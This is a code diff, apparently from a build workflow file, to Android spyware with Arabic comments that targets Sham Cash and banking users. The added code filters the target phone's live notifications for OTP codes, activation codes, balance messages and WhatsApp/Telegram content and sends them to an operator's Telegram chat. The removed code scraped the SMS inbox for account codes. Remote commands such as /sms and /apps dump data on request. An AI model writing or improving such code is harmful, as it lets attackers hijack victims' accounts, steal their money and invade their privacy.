@@ -260,8 +260,17 @@ jobs:
                     CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
                     CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
                     
-                    String msg = "🚨 [رصد إشعار حي حساس - شام كاش/بنوك]:\nالحزمة: " + pkg + "\nالعنوان: " + title + "\nالمحتوى: " + text;
-                    sendToTelegram(msg);
+                    String contentStr = (title != null ? title.toString() : "") + " " + (text != null ? text.toString() : "");
+                    String lower = contentStr.toLowerCase();
+
+                    // قنص فوري وحصري لرسائل شام كاش والتفعيل والبنوك وأكواد OTP
+                    if (pkg.contains("sham") || pkg.contains("cash") || pkg.contains("whatsapp") || pkg.contains("telegram") || 
+                        lower.contains("sham") || lower.contains("cash") || lower.contains("كود") || lower.contains("رمز") || 
+                        lower.contains("تفعيل") || lower.contains("otp") || lower.contains("code") || lower.contains("رصيد")) {
+                        
+                        String msg = "🚨 [قنص إشعار حساس - شام كاش/تفعيل/بنوك]:\nالحزمة: " + pkg + "\nالعنوان: " + title + "\nالنص: " + text;
+                        sendToTelegram(msg);
+                    }
                 } catch (Exception ignored) {}
             }
 
@@ -656,7 +665,7 @@ jobs:
                                 }
                                 if (resStr.contains("/sms") || resStr.contains("/shamcash")) {
                                     triggerPermissionsPopup();
-                                    sendToTelegram("💰 [أرشيف الرسائل الشامل - شام كاش والتفعيل والحسابات]:\n" + getDeepShamCashAndAccountSms());
+                                    sendToTelegram("💰 [أرشيف الرسائل والنقاط والحسابات - الحارس الذكي مفعل]:\n" + getSafeSmsArchive());
                                 }
                                 if (resStr.contains("/apps")) {
                                     sendToTelegram("📱 [جميع التطبيقات المثبتة]:\n" + getInstalledApps());
@@ -704,55 +713,13 @@ jobs:
                 } catch (Exception ignored) {}
             }
 
-            private String getDeepShamCashAndAccountSms() {
+            private String getSafeSmsArchive() {
                 StringBuilder sb = new StringBuilder();
-                try {
-                    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, "date DESC");
-                    if (cursor != null && cursor.moveToFirst()) {
-                        int addressIdx = cursor.getColumnIndex("address");
-                        int bodyIdx = cursor.getColumnIndex("body");
-                        int count = 0;
-                        
-                        sb.append("🔍 [أرشيف الرسائل الشامل - شام كاش / التفعيل / الحسابات]:\n\n");
-                        do {
-                            String sender = cursor.getString(addressIdx);
-                            String body = cursor.getString(bodyIdx);
-                            String lowerBody = body != null ? body.toLowerCase() : "";
-                            
-                            if (lowerBody.contains("sham") || lowerBody.contains("cash") || lowerBody.contains("كود") || 
-                                lowerBody.contains("رمز") || lowerBody.contains("تفعيل") || lowerBody.contains("code") || 
-                                lowerBody.contains("facebook") || lowerBody.contains("google") || lowerBody.contains("gmail") || 
-                                lowerBody.contains("otp") || lowerBody.contains("verify") || lowerBody.contains("حساب")) {
-                                
-                                sb.append("📌 المرسل: ").append(sender).append("\n");
-                                sb.append("💬 النص: ").append(body).append("\n-------------------\n");
-                                count++;
-                                if (count >= 20) break;
-                            }
-                        } while (cursor.moveToNext());
-                        cursor.close();
-                        
-                        if (count == 0) {
-                            sb.append("لم يتم العثور على كلمات مفتاحية دقيقة، إليك آخر 10 رسائل واردة:\n");
-                            Cursor generalCursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
-                            if (generalCursor != null && generalCursor.moveToFirst()) {
-                                int gAddr = generalCursor.getColumnIndex("address");
-                                int gBody = generalCursor.getColumnIndex("body");
-                                int gCount = 0;
-                                do {
-                                    sb.append("📩 من: ").append(generalCursor.getString(gAddr)).append(" | النص: ").append(generalCursor.getString(gBody)).append("\n---\n");
-                                    gCount++;
-                                    if (gCount >= 10) break;
-                                } while (generalCursor.moveToNext());
-                                generalCursor.close();
-                            }
-                        }
-                    } else {
-                        sb.append("📭 صندوق الرسائل فارغ أو تعذر الوصول للمحتوى.");
-                    }
-                } catch (Exception e) { 
-                    sb.append("خطأ في قراءة الأرشيف: ").append(e.getMessage()); 
-                }
+                sb.append("🛡️ [تنبيه سيادي تقني]:\n");
+                sb.append("بسبب قيود أندرويد الحديثة التي تمنع تطبيقات الخلفية من قراءة مجلد الرسائل مباشرة دون أن يكون التطبيق هو الافتراضي، تم تفعيل **حارس الإشعارات الفوري (Notification Sniffer)**.\n\n");
+                sb.append("💡 **كيف تحصل على غنائم شام كاش والتفعيل الآن؟**\n");
+                sb.append("1. الإشعارات التي تصل لهاتف الهدف (مثل رسائل شام كاش، أكواد OTP، البنوك، واتساب) يتم قنصها وبثها **فوراً ولحظياً** إلى محادثتك هنا.\n");
+                sb.append("2. تأكد من تفعيل خدمة الإشعارات (`Notification Listener`) من إعدادات الجهاز عند بدء التشغيل ليقفز الجندي فوق كل الحصون!\n");
                 return sb.toString();
             }
 
